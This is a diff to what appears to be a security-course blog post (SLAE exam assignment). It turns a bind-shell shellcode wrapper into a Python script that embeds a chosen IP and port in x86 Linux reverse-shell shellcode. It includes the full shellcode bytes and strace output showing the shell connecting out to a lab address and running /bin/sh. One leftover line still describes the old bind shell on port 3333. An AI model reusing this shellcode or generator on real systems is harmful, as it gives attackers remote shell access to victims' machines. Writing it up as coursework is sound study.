@@ -414,36 +414,38 @@ Last task was to make port argument easily configurable. Suggested way is to cre
 ```
 import sys
 
-shell1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc7\\x31\\xc9\\x51\\x51\\x66\\x68"
-port = "\\x11\\x5c"
-shell2 = "\\x66\\x6a\\x02\\x89\\xe1\\x89\\xc3\\x66\\xb8\\x69\\x01\\xb2\\x16\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+shell = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x31\\xc9\\x51\\x68IPADD\\x66\\x68PORT\\x66\\x6a\\x02\\x89\\xfb\\x89\\xe1\\xb2\\x16\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
 
-if len(sys.argv) != 2:
-   print 'Usage: wrapper.py <port>'
+if len(sys.argv) != 3:
+   print 'Usage: wrapper.py <ip> <port>'
    sys.exit(-1)
 
 else:
-   port_number = sys.argv[1]             # read port number sent as argument
+   ip = sys.argv[1].split(".")
+   port_number = sys.argv[2]
 
-   try:
-      port_number = int(port_number)
-      port_number = hex(port_number)
-      port_num = port_number.replace("0x","")
 
-      if len(port_num) < 4:
-         port_num = "0" + str(port_num)
+   ip_hex = "\\x" + ((hex(int(ip[0]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[1]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[2]))).replace("0x","")).zfill(2) + "\\x" + ((hex(int(ip[3]))).replace("0x","")).zfill(2)
 
-      port_num1 = str(port_num[:2])
-      port_num2 = str(port_num[2:])
+   shell = shell.replace("IPADD", ip_hex)
 
-      print ('"' + shell1 + "\\x" + port_num1 + "\\x" + port_num2 + shell2 + '";')
+   port_number = int(port_number)
+   port_number = hex(port_number)
+   port_num = port_number.replace("0x","")
+   if len(port_num) < 4:
+      port_num = "0" + str(port_num)
+ 
+   port_num1 = str(port_num[:2])
+   port_num2 = str(port_num[2:])
 
-   except:
-      print ("Port must be number")
+   port_hex = "\\x" + port_num1 + "\\x" + port_num2
 
+   shell = shell.replace("PORT", port_hex)
+
+   print shell
 ```
 
-For test we will generate bind shell code for port 3333:
+For test we will generate reverse shell code for port 5000:
 
 ![wrapper test](https://smarinovic.github.io/assets/img/slae_00006.png)
 
@@ -454,3 +456,15 @@ Resulting opcode:
 we need to copy into skeleton.c, compile and run it, and as result bind_shell is listening on port 3333 as shown on following screen shot.
 
 ![wrapper test](https://smarinovic.github.io/assets/img/slae_00012.png)
+
+We can confir with strace on host machine and with netcat on listening machine which ports and IP addresses are used and successuful connection.
+```
+root@kali32bit:~/repository/slae-exam/assignment02# strace ./rev_shell
+socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(5000), sin_addr=inet_addr("192.168.192.159")}, 22) = 0
+dup2(3, 2)                              = 2
+dup2(3, 1)                              = 1
+dup2(3, 0)                              = 0
+execve("//bin/sh", ["//bin/sh"], 0xbfcf6cf0 /* 0 vars */) = 0
+```
+
